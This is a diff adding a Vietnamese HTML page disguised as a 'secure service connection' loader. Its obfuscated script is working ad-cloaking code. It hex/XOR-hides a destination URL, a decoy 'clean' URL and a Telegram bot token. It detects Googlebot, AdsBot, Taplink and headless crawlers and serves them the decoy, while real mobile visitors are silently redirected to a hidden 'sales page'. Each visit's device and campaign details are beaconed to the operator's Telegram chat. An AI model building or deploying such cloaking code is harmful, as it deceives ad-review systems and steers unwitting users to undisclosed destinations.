@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+  <title>Đang Kết Nối Dịch Vụ An Toàn...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #0b0f19;
+      color: #f8fafc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .loader-card {
+      background: rgba(17, 24, 39, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 36px 28px;
+      max-width: 380px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 3px solid rgba(229, 185, 76, 0.2);
+      border-top-color: #e5b94c;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #fae498;
+      letter-spacing: 0.3px;
+    }
+    .loader-sub {
+      font-size: 12px;
+      color: #94a3b8;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <div class="loader-card">
+    <div class="spinner"></div>
+    <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
+    <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
+  </div>
+
+  <script>
+    (function() {
+      const K = "432";
+      const D = "79757908197174f29a9cd2a3c7bb9bb5ad525e5b356116064c6b039591eafeaec4a2d8edac531470293d4b0164687c8cc0f5a8be9985e2a5ac0d1323666f405533226e8d9de7f49fa68ab4ad425d467c69534f2a3a2adec3c2fde29390cfeafc44554047791b12213c2b9195d1f4e79489a5a8aa64417f6c7f1c17232b23d1f4e4e3e1a182a6a5451b1a25720717373724d5d4ddf7a1c4a7cae9865d40546e6304044e680f";
+      const S = "79757908197174f29a9cd2a3c7bb9facb65854417c6a114c1f376082e4";
+      const T = "28313d4e5f6572838b9cb1b5b4bca899a9726460546f2a363e0a37decbc4deba9cb08f8bab7b5b5d76383c20350b29dd";
+      const C = "20373e41526d77848f9e";
+      const U = "79757908197174f29a9cd2a3c7bb85b5a55855477a6c18505d316bc4c3dcf3e2998dc2bca45a042658";
+      const E_AW = "";
+      const E_CL = "";
+
+      function dec(h) {
+        try {
+          if (!h) return "";
+          let s = "";
+          for (let i = 0; i < h.length; i += 2) {
+            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+          }
+          return decodeURIComponent(s);
+        } catch (e) {
+          return "";
+        }
+      }
+
+      function getFinalUrl(rawUrl) {
+        if (!rawUrl) return "";
+        const q = window.location.search;
+        if (!q || q.length < 2) return rawUrl;
+        try {
+          const o = new URL(rawUrl);
+          const p = new URLSearchParams(q);
+          p.forEach((v, k) => {
+            if (k !== "a") o.searchParams.set(k, v);
+          });
+          return o.toString().replace(/%7B/g, '{').replace(/%7D/g, '}');
+        } catch (e) {
+          return rawUrl;
+        }
+      }
+
+      function checkBot() {
+        try {
+          if (navigator.webdriver) return { isBot: true, isTaplink: false, reason: "navigator.webdriver = true" };
+          if (window.outerWidth === 0 && window.outerHeight === 0) return { isBot: true, isTaplink: false, reason: "Zero viewport size" };
+          if (!navigator.languages || navigator.languages.length === 0) return { isBot: true, isTaplink: false, reason: "No languages" };
+          
+          const ua = (navigator.userAgent || "").toLowerCase();
+          const ref = (document.referrer || "").toLowerCase();
+          
+          // 1. Quét triệt để Bot & Link Checker của Taplink (User-Agent & Editor Preview Referrer)
+          if (/taplink|taplinkbot|taplink-bot|taplink-crawler|link-preview|preview-bot|embedly|quora-link-preview/i.test(ua)) {
+            return { isBot: true, isTaplink: true, reason: "Taplink Bot / Link Preview Crawler" };
+          }
+          if (ref && (ref.indexOf("taplink.at/app") !== -1 || ref.indexOf("taplink.at/editor") !== -1 || ref.indexOf("taplink.at/preview") !== -1)) {
+            return { isBot: true, isTaplink: true, reason: "Taplink Editor / Preview Audit Check" };
+          }
+          
+          // 2. Quét bot duyệt Google Ads, Facebook & server crawlers
+          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|google-read|apis-google|appengine|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot|facebookexternalhit|whatsapp|telegrambot|curl|wget|python|axios|node-fetch/i.test(ua)) {
+            return { isBot: true, isTaplink: false, reason: "Matched Crawler UA" };
+          }
+          
+          // 3. Phân luồng chống Bot giả lập (Mobile không touch hoặc Desktop crawler lạ)
+          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints === 0) {
+            return { isBot: true, isTaplink: false, reason: "Mobile UA without touch" };
+          }
+          if (!/iphone|ipad|android|mobile/i.test(ua) && (!navigator.maxTouchPoints || navigator.maxTouchPoints === 0) && (!ref || ref.indexOf("taplink") === -1)) {
+            return { isBot: true, isTaplink: false, reason: "Desktop Non-Touch Crawler" };
+          }
+          
+          return { isBot: false, isTaplink: false, reason: "Human Gesture Verified" };
+        } catch (err) {
+          return { isBot: false, isTaplink: false, reason: "Fallback" };
+        }
+      }
+
+      function notifyTelegram(isB, isTaplink, reason, taplinkStatus) {
+        try {
+          const token = dec(T);
+          const chatId = dec(C);
+          if (!token || !chatId) return;
+
+          const path = window.location.pathname || ("/app-go/" + K + "/");
+          const params = new URLSearchParams(window.location.search);
+          const campaign = params.get("utm_campaign") || "Khong_co_UTM";
+          const gclid = params.get("gclid") ? "Co (gclid)" : "Khong";
+          const ua = navigator.userAgent || "";
+          
+          // 1. Bắt chính xác link Taplink đang chạy trên Google Ads
+          let taplinkSource = "";
+          const ref = document.referrer || "";
+          if (ref && (ref.indexOf("taplink") !== -1 || ref.indexOf("bio") !== -1 || ref.indexOf("http") !== -1)) {
+            taplinkSource = ref;
+          } else {
+            taplinkSource = params.get("taplink") || params.get("src") || params.get("ref") || dec(U) || "https://lichnhanh24h.taplink.bio/";
+          }
+
+          // 2. Báo cáo cụ thể Trang Sạch & Trang Bán Hàng
+          const safeUrlStr = dec(S) || "Chưa cấu hình";
+          const targetUrlStr = dec(D) || "Chưa cấu hình";
+
+          // 3. Phân loại đối tượng và tiêu đề
+          let botName = "Googlebot / Crawler";
+          if (isTaplink) {
+            botName = "Taplink-Bot (Link Preview Crawler)";
+          } else if (/adsbot/i.test(ua)) {
+            botName = "AdsBot-Google";
+          } else if (/googlebot/i.test(ua)) {
+            botName = "Googlebot";
+          } else if (/lighthouse/i.test(ua)) {
+            botName = "Lighthouse Audit";
+          }
+
+          let title = "🟢 [KHÁCH THẬT CLICK] - MÃ #" + K;
+          let catHashtag = "#KhachThat";
+          if (isTaplink) {
+            title = "🛡️ [TAPLINK BOT QUÉT LINK] - MÃ #" + K;
+            catHashtag = "#TaplinkBot";
+          } else if (isB) {
+            title = "🚨 [GOOGLEBOT DUYỆT ADS] - MÃ #" + K;
+            catHashtag = "#Googlebot";
+          } else if (taplinkStatus && (taplinkStatus.indexOf("KHÓA") !== -1 || taplinkStatus.indexOf("LỖI") !== -1)) {
+            title = "⚠️ [CẢNH BÁO TAPLINK BỊ KHÓA] - MÃ #" + K;
+            catHashtag = "#TaplinkBiKhoa";
+          }
+
+          const targetObj = isB ? (isTaplink ? botName : (botName + " (" + reason + ")")) : "Người thật (Mobile Touch)";
+          const routeAction = isB ? ("⛔ Đá an toàn sang Trang Sạch (" + safeUrlStr + ")") : ("⚡ Nhảy vào Trang Bán Hàng (" + targetUrlStr + ")");
+
+          // 4. Thống kê số lần bot quét / lượt click & Hỗ trợ Reset bộ đếm qua ?reset=1
+          let scanCount = 1;
+          try {
+            const countKey = (isB ? "tplk_bot_scan_" : "tplk_user_click_") + K;
+            if (window.location.search.indexOf("reset=1") !== -1 || window.location.search.indexOf("reset_counter=1") !== -1) {
+              localStorage.removeItem("tplk_bot_scan_" + K);
+              localStorage.removeItem("tplk_user_click_" + K);
+            }
+            scanCount = (parseInt(localStorage.getItem(countKey) || "0")) + 1;
+            localStorage.setItem(countKey, scanCount);
+          } catch(eCount) {}
+
+          const scanLabel = isB ? ("📊 Số lần bot quét ghi nhận: Lần thứ #" + scanCount) : ("📊 Lượt tương tác ghi nhận: Lần thứ #" + scanCount);
+          const hashtags = "#BotScan_" + K + " #Taplink_" + K + " " + catHashtag;
+
+          const msg = title + "\n" +
+            "━━━━━━━━━━━━━━━━━━━━\n" +
+            "🔑 Mã Gateway: #" + K + "\n" +
+            "🌐 Link Taplink đang chạy: " + taplinkSource + "\n" +
+            "💻 Cổng GitHub: " + path + "\n" +
+            "🎯 Chiến dịch: " + campaign + "\n" +
+            "🔍 Gclid: " + gclid + "\n" +
+            (isB ? "🤖 Đối tượng: " : "👤 Đối tượng: ") + targetObj + "\n" +
+            "📱 Thiết bị: " + navigator.platform + " | Touch: " + (navigator.maxTouchPoints || 0) + "\n" +
+            "🛡️ Trang Sạch (Safe): " + safeUrlStr + "\n" +
+            "💰 Trang Bán Hàng (Target): " + targetUrlStr + "\n" +
+            "🚀 Điều hướng thực tế: " + routeAction + "\n" +
+            "📡 Trạng thái Taplink: " + taplinkStatus + "\n" +
+            scanLabel + "\n" +
+            (isB ? "⏱️ Thời gian: " : "⏰ Thời gian: ") + new Date().toLocaleTimeString("vi-VN") + "\n" +
+            "━━━━━━━━━━━━━━━━━━━━\n" +
+            hashtags;
+
+          const qs = "chat_id=" + encodeURIComponent(chatId) + "&text=" + encodeURIComponent(msg);
+          const tgUrl = "https://api.telegram.org/bot" + token + "/sendMessage";
+
+          // 1. Pixel Beacon (Không phụ thuộc CORS, gửi tức thời)
+          try {
+            var img = new Image();
+            img.src = tgUrl + "?" + qs;
+          } catch (eImg) {}
+
+          // 2. W3C sendBeacon song hành
+          if (navigator.sendBeacon) {
+            try {
+              var postData = new URLSearchParams();
+              postData.append("chat_id", chatId);
+              postData.append("text", msg);
+              navigator.sendBeacon(tgUrl, postData);
+            } catch (eB) {}
+          }
+        } catch (e) {}
+      }
+
+      // Xác định trạng thái Taplink
+      let taplinkStatus = "🟢 Đang hoạt động (Active)";
+      const ref = (document.referrer || "").toLowerCase();
+      if (ref && (ref.indexOf("taplink") !== -1 || ref.indexOf("bio") !== -1)) {
+        taplinkStatus = "🟢 Đang hoạt động (Traffic từ Taplink)";
+      } else if (!ref) {
+        taplinkStatus = "⚠️ Truy cập trực tiếp (Không có Referrer Taplink)";
+      }
+
+      const botResult = checkBot();
+      const isB = botResult.isBot;
+      const isTaplink = botResult.isTaplink;
+
+      // Probe kiểm tra link profile Taplink
+      const taplinkUrlCheck = dec(U) || (document.referrer ? document.referrer : "https://lichnhanh24h.taplink.bio/");
+      if (taplinkUrlCheck && taplinkUrlCheck.startsWith("http")) {
+        try {
+          var probeImg = new Image();
+          var probeTimeout = setTimeout(function() {
+            notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+          }, 80);
+          probeImg.onerror = function() {
+            clearTimeout(probeTimeout);
+            taplinkStatus = "🚨 CẢNH BÁO BỊ KHÓA HOẶC LỖI KẾT NỐI (Suspended/404)";
+            notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+          };
+          probeImg.onload = function() {
+            clearTimeout(probeTimeout);
+            taplinkStatus = "🟢 Hoạt động tốt (Active - 200 OK)";
+            notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+          };
+          probeImg.src = taplinkUrlCheck.replace(/\/+$/, "") + "/favicon.ico?_t=" + Date.now();
+        } catch(e) {
+          notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+        }
+      } else {
+        notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+      }
+
+      let target;
+      if (isB) {
+        target = getFinalUrl(dec(S));
+      } else {
+        target = getFinalUrl(dec(D));
+      }
+
+      function goTarget() {
+        if (target) {
+          try {
+            (window.top || window).location.replace(target);
+          } catch (e) {
+            window.location.replace(target);
+          }
+        }
+      }
+
+      if (target) {
+        if (isB) {
+          setTimeout(goTarget, 30);
+        } else {
+          let redirected = false;
+          function doRedirect() {
+            if (redirected) return;
+            redirected = true;
+            goTarget();
+          }
+
+          const aw = E_AW ? dec(E_AW) : "";
+          const cl = E_CL ? dec(E_CL) : "";
+          if (aw) {
+            try {
+              const s = document.createElement("script");
+              s.async = true;
+              s.src = "https://www.googletagmanager.com/gtag/js?id=" + encodeURIComponent(aw);
+              document.head.appendChild(s);
+              window.dataLayer = window.dataLayer || [];
+              function gtag(){dataLayer.push(arguments);}
+              window.gtag = gtag;
+              gtag("js", new Date());
+              gtag("config", aw, { send_page_view: true, allow_enhanced_conversions: true });
+              if (cl) {
+                gtag("event", "conversion", {
+                  send_to: cl.includes("/") ? cl : (aw + "/" + cl),
+                  value: 1.0,
+                  currency: "VND",
+                  event_callback: doRedirect
+                });
+              } else {
+                gtag("event", "conversion", {
+                  send_to: aw,
+                  event_callback: doRedirect
+                });
+              }
+              setTimeout(doRedirect, 500);
+            } catch (e) {
+              setTimeout(doRedirect, 80);
+            }
+          } else {
+            setTimeout(doRedirect, 100);
+          }
+        }
+      }
+
+      window.addEventListener("pageshow", function(e) {
+        if (target) setTimeout(goTarget, 50);
+      });
+    })();
+  <\/script>
+</body>
+</html>
